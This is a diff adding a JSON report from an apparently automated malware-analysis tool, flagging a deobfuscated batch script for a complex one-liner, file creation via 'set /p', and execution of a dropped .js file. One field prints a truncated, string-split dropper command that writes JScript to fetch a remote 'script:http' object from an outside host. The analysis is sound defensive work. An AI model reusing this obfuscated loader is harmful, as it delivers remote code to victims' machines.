@@ -1,0 +1,124 @@
+{
+  "extra": {
+    "drop_file": false,
+    "score": 20,
+    "sections": [
+      {
+        "auto_collapse": false,
+        "body": {
+          "Number of line after deobfuscation": 6
+        },
+        "body_config": {},
+        "body_format": "KEY_VALUE",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 6,
+          "score": 10,
+          "score_map": {},
+          "signatures": {}
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Complexe One-Liner",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": [
+          {
+            "Command [trunc]": "set/p K1J0=\"var C66d=\"sc\"+\"r\" D66d=\"ip\"+\"t:h\" E66d=\"T\"+\"tP\"+\":\" GetObject(C66d+D66d+E66d+'//n7eo5j.r",
+            "Filename": "C:\\BT59TX5\\BT59TX5.jS"
+          }
+        ],
+        "body_config": {
+          "column_order": [
+            "Filename",
+            "Command [trunc]"
+          ]
+        },
+        "body_format": "TABLE",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 8,
+          "score": 10,
+          "score_map": {},
+          "signatures": {}
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "File creation using set /p",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": [
+          {
+            "Command": "c:\\bt59tx5\\bt59tx5.js",
+            "Filename": "c:\\bt59tx5\\bt59tx5.js"
+          }
+        ],
+        "body_config": {
+          "column_order": [
+            "Filename",
+            "Command"
+          ]
+        },
+        "body_format": "TABLE",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 9,
+          "score": 0,
+          "score_map": {},
+          "signatures": {}
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Execution of manipulated content",
+        "zeroize_on_tag_safe": false
+      }
+    ]
+  },
+  "files": {
+    "extracted": [
+      {
+        "name": "04abd991a2_deobfuscated.bat",
+        "sha256": "04abd991a2e1a9a52682d55ab09d3f1f296c156f93f3f7e814bc54880871fa95"
+      },
+      {
+        "name": "C:\\BT59TX5\\BT59TX5.jS",
+        "sha256": "98bca040a6b6742550035371c28c0b838ac1ed4c6d6427652f6b0a812d549e4c"
+      }
+    ],
+    "supplementary": []
+  },
+  "results": {
+    "heuristics": [
+      {
+        "attack_ids": [],
+        "heur_id": 6,
+        "signatures": []
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 8,
+        "signatures": []
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 9,
+        "signatures": []
+      }
+    ],
+    "tags": {},
+    "temp_submission_data": {}
+  }
+}
